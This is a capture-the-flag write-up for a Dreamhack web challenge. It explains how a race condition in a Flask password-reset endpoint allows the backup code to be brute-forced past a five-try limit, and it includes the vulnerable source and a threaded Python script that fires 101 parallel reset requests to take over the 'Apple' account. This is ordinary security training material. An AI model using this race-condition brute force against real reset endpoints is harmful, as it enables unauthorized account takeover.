# login-1
This challenge involves race-condition attack

SQLI is not possible because dev used prepared sql
Bruteforce the backup code is not possible since it only allows 5 tries

### User enumeration
Using the /user/\<id\> we find the user `Apple` that is level 1 (can access /admin)
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/ad71be0108bbbb55109ce9120f2bddc49ff7e856f4f786f5556b3c5d81f4839e.png)

## Solve
Notice that in the /forgot_password endpoint, code:
```python
@app.route('/forgot_password', methods=['GET', 'POST'])
def forgot_password():
    if request.method == 'GET':
        return render_template('forgot.html')
    else:
        userid = request.form.get("userid")
        newpassword = request.form.get("newpassword")
        backupCode = request.form.get("backupCode", type=int)

        conn = get_db()
        cur = conn.cursor()
        user = cur.execute('SELECT * FROM user WHERE id = ?', (userid,)).fetchone()
        if user:
            # security for brute force Attack.
            time.sleep(1)

            if user['resetCount'] == MAXRESETCOUNT:
                return "<script>alert('reset Count Exceed.');history.back(-1);</script>"
            
            if user['backupCode'] == backupCode:
                newbackupCode = makeBackupcode()
                updateSQL = "UPDATE user set pw = ?, backupCode = ?, resetCount = 0 where idx = ?"
                cur.execute(updateSQL, (hashlib.sha256(newpassword.encode()).hexdigest(), newbackupCode, str(user['idx'])))
                msg = f"<b>Password Change Success.</b><br/>New BackupCode : {newbackupCode}"

            else:
                updateSQL = "UPDATE user set resetCount = resetCount+1 where idx = ?"
                cur.execute(updateSQL, (str(user['idx'])))
                msg = f"Wrong BackupCode !<br/><b>Left Count : </b> {(MAXRESETCOUNT-1)-user['resetCount']}"
            
            conn.commit()
            return render_template("index.html", msg=msg)

        return "<script>alert('User Not Found.');history.back(-1);</script>";
```

When a request is sent, the `resetCount` is not yet updated immediately but only after the backupCode check is completed. This means we can send 100 requests (backupCode is only 1 - 100) in parallel and reset the password before the `resetCount` is increased to 5. This is a race-condition bruteforce attack

Code to send password reset in parrallel:
```python
import requests, threading

url = "http://host3.dreamhack.games:15237"

for i in range(101):
    data = {
        "userid": "Apple",
        "newpassword": "Apple",
        "backupCode": {i}
    }

    th = threading.Thread(target=requests.post, args=(url+"/forgot_password", data))
    th.start()
```

After running that script, we can login into `Apple:Apple` and get the /admin page to view the flag:
![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/9084da8c3003590a6d7acf072d58e09da819cac3be5cb7d91e86a59e28aec6de.png)
